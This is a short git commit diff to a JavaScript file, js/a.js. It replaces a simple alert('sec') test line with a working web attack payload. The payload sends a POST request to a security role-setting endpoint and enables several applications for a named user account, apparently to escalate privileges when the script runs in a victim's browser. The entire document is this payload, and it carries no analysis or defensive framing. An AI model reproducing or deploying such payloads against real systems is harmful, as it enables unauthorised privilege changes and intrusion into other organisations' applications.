c78e6ef8ea2641192e314b0bf990f87ccdd1ddaf
hackkimss <hackkimss@gmail.com>
2022-04-15 12:31:21 +0900

    Update a.js

--- js/a.js
+++ js/a.js
@@ -1,1 +1,8 @@
-alert('sec');
+var xhr = new XMLHttpRequest();
+xhr.open('POST', '/sdm/security/user/updateRoleServiceSettingClient.rui', true);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xhr.onload = function () {
+    // do something to response
+    console.log(this.responseText);
+};
+xhr.send('dui_datasetdata=[{"metaData":{"dataSetId":"dsAppWorker","count":1,"totalCount":0},"records":[{"duistate":1,"appIds":"visitportal,lgedumadang,CMIS","userId":"joyoflife@lgcns.com","useYn":"Y"}]}]&dui_datasetdatatype=1&');
